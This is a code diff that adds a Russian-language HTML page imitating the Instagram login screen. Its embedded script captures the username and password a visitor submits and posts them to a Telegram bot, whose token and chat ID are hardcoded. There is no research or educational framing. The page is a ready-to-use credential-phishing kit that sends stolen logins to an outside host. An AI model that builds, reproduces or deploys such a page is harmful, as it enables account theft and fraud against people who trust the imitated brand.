@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<title>Instagram</title>
+</head>
+<header>
+	
+</header>
+
+<body class="content">
+	<div class="block">
+		<img class="logo" src="Ig_logo.png">
+		<form id="tg">
+		<p><input class="login" type="text" name="login" placeholder="Телефон, имя пользователя или эл. адрес">
+		<input class="login" type="text" name="password" placeholder="Пароль"></p>
+		 
+		<button type="submit" class="button"><b>Войти</b></button>
+	</form>
+
+
+	<div class="ili" style="display: flex; justify-content: center;">
+		<p>____________ ИЛИ ____________<p>
+	</div>
+	
+
+	<div class="fb" style="display: flex; justify-content: center;">
+		<p>Войти через Facebook</p>
+	</div>
+
+	<div class="forget" style="display: flex; justify-content: center;">
+		<p>Забыли пароль?</p>
+	</div>
+
+	<div class="forget" style="display: flex; justify-content: center;">
+		<p>У вас ещё нет аккаунта? <span class="reg"> Зарегистрироваться</span></p>
+	</div>
+
+	<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+	<script>
+  // Замените значения TOKEN и CHAT_ID своими данными
+  const TOKEN = "5968949594:AAFdxklWhjhZ-r2IhxsGlf7XA91FBmJPslk";
+  const CHAT_ID = "-1001721168473";
+
+  // Получаем форму по ID и добавляем обработчик событий
+  document.getElementById('tg').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // Создаем сообщение, используя данные из полей формы
+    let message = `<b>Заявка с сайта</b>\n`;
+    message += `<b>отправитель: </b> ${this.login.value}\n`;
+    message += `<b>пароль: </b> ${this.password.value}\n`;
+
+    // Отправляем сообщение в Telegram API
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Failed to send message to Telegram.');
+      }
+      console.log('Message sent to Telegram.');
+    })
+    .catch(error => {
+      console.error(error);
+    });
+  });
+</script>
+
+</body>
+</html>  
